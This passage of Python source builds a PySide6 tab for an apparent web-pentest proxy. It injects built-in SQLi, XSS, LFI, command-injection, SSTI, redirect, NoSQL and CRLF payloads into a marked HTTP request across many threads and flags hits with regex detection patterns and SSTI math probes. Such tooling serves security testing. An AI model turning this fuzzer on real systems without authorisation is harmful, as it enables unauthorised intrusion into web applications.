    (r"(?m)^X-Forwarded-For:\s*127\.",         "X-Forwarded-For inyectado"),
    (r"(?m)^X-Real-IP:\s*127\.",               "X-Real-IP inyectado"),
    (r"(?m)^Access-Control-Allow-Origin:\s*\*","CORS ACAO inyectado"),
    (r"(?m)^X-A:\s*1",                         "Header X-A inyectado"),
    (r"<script>alert\(1\)</script>",           "XSS via response splitting"),
]

# ── Registro central de tipos ─────────────────────────────────
_TOOL_REGISTRY: dict[str, tuple[list[str], list[tuple[str, str]]]] = {
    "SQLi":          (_SQLI_PAYLOADS,     _SQLI_DETECT),
    "XSS":           (_XSS_PAYLOADS,      _XSS_DETECT),
    "LFI":           (_LFI_PAYLOADS,      _LFI_DETECT),
    "CMDi":          (_CMDI_PAYLOADS,     _CMDI_DETECT),
    "SSTI":          (_SSTI_PAYLOADS,     _SSTI_DETECT),
    "Open Redirect": (_REDIRECT_PAYLOADS, _REDIRECT_DETECT),
    "NoSQL":         (_NOSQL_PAYLOADS,    _NOSQL_DETECT),
    "CRLF":          (_CRLF_PAYLOADS,     _CRLF_DETECT),
}

_TOOL_NAMES = list(_TOOL_REGISTRY.keys())

# Indicadores de reflexión para XSS
_XSS_KEYS = (b"<script", b"alert(", b"onerror=", b"onload=",
             b"javascript:", b"<svg", b"confirm(", b"prompt(")


class _InjWorker(QObject):
    result   = Signal(object)
    finished = Signal()
    progress = Signal(int, int)


class InjectionTab(QWidget):
    def __init__(self, vuln_type: str = "SQLi",
                 raw: bytes = b"", use_tls: bool = False):
        super().__init__()
        self._running      = False
        self._thread: threading.Thread | None = None
        self._fallback_tls = use_tls
        self._results: list[dict] = []
        self._worker = _InjWorker()
        self._worker.result.connect(self._on_result)
        self._worker.finished.connect(self._on_finished)
        self._worker.progress.connect(self._on_progress)
        # Estado activo — se actualiza al cambiar el combo
        self._active_payloads: list[str] = []
        self._active_detect:   list[tuple] = []
        self._vuln_type = ""
        self._build_ui()
        # Seleccionar tipo inicial (dispara _on_type_changed)
        idx = self.type_combo.findText(vuln_type)
        self.type_combo.setCurrentIndex(max(0, idx))
        if raw:
            self.request_edit.setPlainText(decode(raw))


    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(12, 12, 12, 12)
        root.setSpacing(10)

        # ── barra superior
        top = QHBoxLayout()
        top.setSpacing(8)

        top.addWidget(QLabel("Tipo:"))
        self.type_combo = QComboBox()
        self.type_combo.addItems(_TOOL_NAMES)
        self.type_combo.setMinimumWidth(130)
        self.type_combo.currentTextChanged.connect(self._on_type_changed)
        top.addWidget(self.type_combo)

        self.payload_lbl = QLabel("")
        self.payload_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
        top.addWidget(self.payload_lbl)

        top.addStretch()

        top.addWidget(QLabel("Hilos:"))
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 30)
        self.threads_spin.setValue(10)
        top.addWidget(self.threads_spin)

        self.start_btn = QPushButton("▶  Iniciar")
        self.start_btn.setObjectName("primaryButton")
        self.start_btn.clicked.connect(self._toggle)
        top.addWidget(self.start_btn)

        self.clear_btn = QPushButton("Limpiar")
        self.clear_btn.clicked.connect(self._clear)
        top.addWidget(self.clear_btn)

        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setFormat("%v / %m")
        self.progress_bar.setValue(0)
        self.progress_bar.setFixedHeight(14)
        self.progress_bar.setFixedWidth(180)
        top.addWidget(self.progress_bar)

        root.addLayout(top)

        # ── splitter principal
        main_split = QSplitter(Qt.Horizontal)
        main_split.setHandleWidth(8)

        # ── panel izquierdo
        left = QWidget()
        ll = QVBoxLayout(left)
        ll.setContentsMargins(0, 0, 0, 0)
        ll.setSpacing(8)

        cap = QLabel(f"Petición HTTP  —  marca la zona de inyección con  {MARKER}…{MARKER}")
        cap.setObjectName("paneCaption")
        ll.addWidget(cap)

        self.request_edit = QPlainTextEdit()
        self.request_edit.setFont(MONO)
        self.request_edit.setPlaceholderText(
            f"GET /search?q={MARKER}test{MARKER} HTTP/1.1\r\nHost: ejemplo.com\r\n\r\n")
        self.request_edit.setContextMenuPolicy(Qt.CustomContextMenu)
        self.request_edit.customContextMenuRequested.connect(self._req_ctx_menu)
        HTTPHighlighter(self.request_edit.document())
        ll.addWidget(self.request_edit, 3)

        btn_row = QHBoxLayout()
        btn_row.setSpacing(6)
        mark_btn = QPushButton(f"Marcar  {MARKER}…{MARKER}")
        mark_btn.clicked.connect(self._mark_selection)
        btn_row.addWidget(mark_btn)
        clr_btn = QPushButton("Limpiar marcadores")
        clr_btn.clicked.connect(self._clear_markers)
        btn_row.addWidget(clr_btn)
        btn_row.addStretch()
        ll.addLayout(btn_row)

        custom_cap = QLabel("Payloads adicionales  (uno por línea)")
        custom_cap.setObjectName("paneCaption")
        ll.addWidget(custom_cap)

        self.custom_payloads = QPlainTextEdit()
        self.custom_payloads.setFont(MONO)
        self.custom_payloads.setMaximumHeight(90)
        self.custom_payloads.setPlaceholderText(
            "Payloads propios — se añaden a la lista integrada…")
        ll.addWidget(self.custom_payloads)

        main_split.addWidget(left)

        # ── panel derecho
        right = QWidget()
        rl = QVBoxLayout(right)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(6)

        # Filtros
        fbar = QFrame()
        fbar.setObjectName("controlBar")
        flay = QHBoxLayout(fbar)
        flay.setContentsMargins(8, 5, 8, 5)
        flay.setSpacing(8)

        self.hits_only_chk = QCheckBox("Solo hits")
        self.hits_only_chk.stateChanged.connect(self._apply_filter)
        flay.addWidget(self.hits_only_chk)

        flay.addWidget(QLabel("Código:"))
        self.filter_code = QLineEdit()
        self.filter_code.setPlaceholderText("200,302…  o  !404")
        self.filter_code.setMaximumWidth(110)
        self.filter_code.textChanged.connect(self._apply_filter)
        flay.addWidget(self.filter_code)

        flay.addWidget(QLabel("Grep:"))
        self.filter_grep = QLineEdit()
        self.filter_grep.setPlaceholderText("texto en respuesta…")
        self.filter_grep.setMaximumWidth(150)
        self.filter_grep.textChanged.connect(self._apply_filter)
        flay.addWidget(self.filter_grep)

        flay.addStretch()
        self.count_lbl = QLabel("0 resultados")
        self.count_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
        flay.addWidget(self.count_lbl)
        rl.addWidget(fbar)

        # Tabla de resultados
        vsplit = QSplitter(Qt.Vertical)
        vsplit.setHandleWidth(8)

        self.result_table = QTableWidget(0, 6)
        self.result_table.setHorizontalHeaderLabels(
            ["#", "Payload", "Estado", "Long.", "ms", "Detección"])
        self.result_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.result_table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.result_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.result_table.setAlternatingRowColors(True)
        self.result_table.setShowGrid(False)
        self.result_table.verticalHeader().setVisible(False)
        self.result_table.verticalHeader().setDefaultSectionSize(26)
        rh = self.result_table.horizontalHeader()
        rh.setSectionResizeMode(1, QHeaderView.Stretch)
        rh.setSectionResizeMode(5, QHeaderView.Stretch)
        rh.setHighlightSections(False)
        rh.setSortIndicatorShown(True)
        self.result_table.setColumnWidth(0, 45)
        self.result_table.setColumnWidth(2, 65)
        self.result_table.setColumnWidth(3, 75)
        self.result_table.setColumnWidth(4, 55)
        self.result_table.itemSelectionChanged.connect(self._on_selection)
        vsplit.addWidget(self.result_table)

        # Detalle req/resp
        detail = QWidget()
        dl = QVBoxLayout(detail)
        dl.setContentsMargins(0, 4, 0, 0)
        dl.setSpacing(0)
        det_split = QSplitter(Qt.Horizontal)
        det_split.setHandleWidth(8)
        for attr, title in [("detail_req", "Petición enviada"),
                             ("detail_resp", "Respuesta recibida")]:
            box = QWidget()
            bl = QVBoxLayout(box)
            bl.setContentsMargins(0, 0, 0, 0)
            bl.setSpacing(4)
            lbl = QLabel(title)
            lbl.setObjectName("paneCaption")
            bl.addWidget(lbl)
            edit = QPlainTextEdit()
            edit.setFont(MONO)
            edit.setReadOnly(True)
            HTTPHighlighter(edit.document())
            bl.addWidget(edit)
            setattr(self, attr, edit)
            det_split.addWidget(box)
        dl.addWidget(det_split)
        vsplit.addWidget(detail)
        vsplit.setSizes([300, 220])
        rl.addWidget(vsplit, 1)

        main_split.addWidget(right)
        main_split.setSizes([370, 730])
        root.addWidget(main_split, 1)


    def _on_type_changed(self, vuln_type: str):
        if self._running:
            self._running = False
            self.start_btn.setText("▶  Iniciar")
        self._vuln_type = vuln_type
        payloads, detect = _TOOL_REGISTRY.get(vuln_type, ([], []))
        self._active_payloads = payloads
        self._active_detect   = [(re.compile(p, re.I | re.S), d) for p, d in detect]
        self.payload_lbl.setText(f"{len(payloads)} payloads integrados")


    def _req_ctx_menu(self, pos):
        menu = self.request_edit.createStandardContextMenu()
        cursor = self.request_edit.textCursor()
        if cursor.hasSelection():
            menu.addSeparator()
            from PySide6.QtGui import QAction
            act = QAction(f"Marcar  {MARKER}…{MARKER}", menu)
            act.triggered.connect(self._mark_selection)
            menu.addAction(act)
        menu.exec(self.request_edit.viewport().mapToGlobal(pos))

    def _mark_selection(self):
        cursor = self.request_edit.textCursor()
        if cursor.hasSelection():
            cursor.insertText(f"{MARKER}{cursor.selectedText()}{MARKER}")

    def _clear_markers(self):
        self.request_edit.setPlainText(
            self.request_edit.toPlainText().replace(MARKER, ""))


    @staticmethod
    def _find_markers(template: str) -> list[tuple[int, int]]:
        positions, i = [], 0
        while True:
            s = template.find(MARKER, i)
            if s == -1: break
            e = template.find(MARKER, s + 1)
            if e == -1: break
            positions.append((s, e))
            i = e + 1
        return positions

    @staticmethod
    def _substitute(template: str, markers: list[tuple[int, int]], payload: str) -> str:
        parts, prev = [], 0
        for s, e in markers:
            parts.append(template[prev:s])
            parts.append(payload)
            prev = e + 1
        parts.append(template[prev:])
        return "".join(parts)


    def _detect(self, payload: str, raw_resp: bytes) -> str | None:
        # Buscar en respuesta completa (necesario para CRLF y Open Redirect)
        full_text = raw_resp.decode("utf-8", "replace")
        body = raw_resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw_resp else b""
        for pattern, desc in self._active_detect:
            if pattern.search(full_text):
                return desc
        # XSS: reflexión dinámica en el body
        if self._vuln_type == "XSS":
            raw_p = payload.encode("utf-8", "replace").lower()
            body_lower = body.lower()
            for key in _XSS_KEYS:
                if key in raw_p and key in body_lower:
                    return f"Reflexión: «{key.decode()}»"
        # SSTI: verificar que el resultado matemático aparece SIN los marcadores
        if self._vuln_type == "SSTI":
            _SSTI_MATH = {
                "{{7*7}}": "49", "${7*7}": "49", "<%= 7*7 %>": "49",
                "#{7*7}": "49", "*{7*7}": "49",
                "{{7*'7'}}": "7777777", "${7*'7'}": "7777777",
                "{{234*567}}": "132678", "${234*567}": "132678",
                "{{7**7}}": "823543",
            }
            expected = _SSTI_MATH.get(payload)
            if expected and expected in full_text and payload not in full_text:
                return f"SSTI: {payload} → {expected}"
        return None


    def _toggle(self):
        if self._running:
            self._running = False
            self.start_btn.setText("▶  Iniciar")
        else:
            self._start()

    def _start(self):
        template = self.request_edit.toPlainText()
        if not template.strip():
            QMessageBox.warning(self, "Petición vacía", "Introduce una petición HTTP.")
            return
        markers = self._find_markers(template)
        if not markers:
            QMessageBox.warning(self, "Sin marcador",
                f"Rodea la zona de inyección con {MARKER}…{MARKER}")
            return

        raw_text = template.replace("\r\n", "\n").replace("\n", "\r\n")
        raw = raw_text.encode("utf-8", "replace")
        headers  = hm.parse_headers(raw)
        host_val = headers.get("host", "").strip()
        if not host_val:
            QMessageBox.warning(self, "Host no encontrado",
                                "La petición debe incluir un header Host:")
            return

        if ":" in host_val:
            host, _, p_str = host_val.rpartition(":")
            try:
                port = int(p_str)
            except ValueError:
                host, port = host_val, 443 if self._fallback_tls else 80
        else:
            host = host_val
            port = 443 if self._fallback_tls else 80
        use_tls = port in (443, 8443) or self._fallback_tls

        payloads = list(self._active_payloads)
        for line in self.custom_payloads.toPlainText().splitlines():
            line = line.strip()
            if line:
                payloads.append(line)

        if not payloads:
            QMessageBox.warning(self, "Sin payloads", "Selecciona un tipo de ataque.")
            return

        self._running = True
        self.result_table.setRowCount(0)
        self._results.clear()
        self.detail_req.clear()
        self.detail_resp.clear()
        self.start_btn.setText("■  Detener")
        self.progress_bar.setMaximum(len(payloads))
        self.progress_bar.setValue(0)
        self.count_lbl.setText(f"0 / {len(payloads)}")
        # Bloquear el combo mientras corre
        self.type_combo.setEnabled(False)

        self._thread = threading.Thread(
            target=self._run,
            args=(template, markers, payloads, host, port, use_tls,
                  self.threads_spin.value()),
            daemon=True,
        )
        self._thread.start()

    def _run(self, template, markers, payloads, host, port, use_tls, n_threads):
        sem  = threading.Semaphore(n_threads)
        lock = threading.Lock()
        done = [0]
        total = len(payloads)

        def send_one(idx, payload):
            if not self._running:
                sem.release()
                return
            injected = self._substitute(template, markers, payload)
            injected = injected.replace("\r\n", "\n").replace("\n", "\r\n")
            raw_req  = injected.encode("utf-8", "replace")
            t0 = time.perf_counter()
            raw_resp = b""
            try:
                raw_resp = send_raw_request(raw_req, host, port, use_tls)
            except Exception:
                pass
            finally:
                sem.release()
            ms = (time.perf_counter() - t0) * 1000
            status, length = "ERR", 0
            if raw_resp:
                first = raw_resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                pts = first.split(" ", 2)
                status = pts[1] if len(pts) >= 2 else ""
                length = len(raw_resp)
            detection = self._detect(payload, raw_resp) if raw_resp else None
            self._worker.result.emit({
                "idx":       idx,
                "payload":   payload,
                "status":    status,
                "length":    length,
                "ms":        ms,
                "hit":       detection is not None,
                "detection": detection or "—",
                "raw_req":   raw_req,
                "raw_resp":  raw_resp,
            })
            with lock:
                done[0] += 1
                self._worker.progress.emit(done[0], total)

        threads = []
        for idx, payload in enumerate(payloads):
            if not self._running: break
            sem.acquire()
            t = threading.Thread(target=send_one, args=(idx, payload), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        self._worker.finished.emit()


    @Slot(object)
    def _on_result(self, entry: dict):
        self._results.append(entry)
        if self._visible(entry):
            self._add_row(entry)
        self._update_count()

    @Slot()
    def _on_finished(self):
        self._running = False
        self.start_btn.setText("▶  Iniciar")
        self.type_combo.setEnabled(True)
        self._update_count()

    @Slot(int, int)
    def _on_progress(self, done, total):
        self.progress_bar.setValue(done)

    def _on_selection(self):
        items = self.result_table.selectedItems()
        if not items:
            self.detail_req.clear()
            self.detail_resp.clear()
            return
        entry = items[0].data(Qt.UserRole)
        if entry:
            self.detail_req.setPlainText(decode(entry.get("raw_req", b"")))
            self.detail_resp.setPlainText(decode_http(entry.get("raw_resp", b"")))


    def _visible(self, entry: dict) -> bool:
        if self.hits_only_chk.isChecked() and not entry["hit"]:
            return False
        code_f = self.filter_code.text().strip()
        if code_f:
            st = entry["status"]
            if code_f.startswith("!"):
                if st in [c.strip() for c in code_f[1:].split(",")]:
                    return False
            else:
                if st not in [c.strip() for c in code_f.split(",")]:
                    return False
        grep = self.filter_grep.text().strip()
        if grep:
            if grep.lower().encode("utf-8", "replace") not in \
               entry.get("raw_resp", b"").lower():
                return False
        return True

    def _apply_filter(self):
        self.result_table.setRowCount(0)
        for entry in self._results:
            if self._visible(entry):
                self._add_row(entry)
        self._update_count()

    def _update_count(self):
        hits  = sum(1 for r in self._results if r["hit"])
        shown = self.result_table.rowCount()
        total = len(self._results)
        self.count_lbl.setText(
            f"{shown} mostrados  —  {hits} hits  —  {total} total")

    _STATUS_FG = {"2": "#5fd38a", "3": "#4fc3d6", "4": "#ffb454", "5": "#ff6b6b"}

    def _add_row(self, entry: dict):
        row = self.result_table.rowCount()
        self.result_table.insertRow(row)
        hit = entry["hit"]
        bg  = QColor(_HIT_BG) if hit else None
        for col, text in enumerate([
            str(entry["idx"] + 1),
            entry["payload"],
            entry["status"],
            str(entry["length"]),
            f"{entry['ms']:.0f}",
            entry["detection"],
        ]):
            item = QTableWidgetItem(text)
            item.setData(Qt.UserRole, entry)
            if bg:
                item.setBackground(bg)
            if col == 2:
                fg = self._STATUS_FG.get(entry["status"][:1], "")
                if fg:
                    item.setForeground(QColor(fg))
            elif col == 5 and hit:
                item.setForeground(QColor("#5fd38a"))
            self.result_table.setItem(row, col, item)

    def _clear(self):
        self._results.clear()
        self.result_table.setRowCount(0)
        self.detail_req.clear()
        self.detail_resp.clear()
        self.progress_bar.setValue(0)
        self.count_lbl.setText("0 resultados")


    def load_from_flow(self, raw: bytes, use_tls: bool = False,
                       vuln_type: str | None = None):
        self._fallback_tls = use_tls
        self.request_edit.setPlainText(decode(raw))
        if vuln_type:
            idx = self.type_combo.findText(vuln_type)
            if idx >= 0:
                self.type_combo.setCurrentIndex(idx)


# Alias retrocompatibles (por si algo los importa directamente)
SQLiTab = InjectionTab
XSSTab  = InjectionTab
LFITab  = InjectionTab
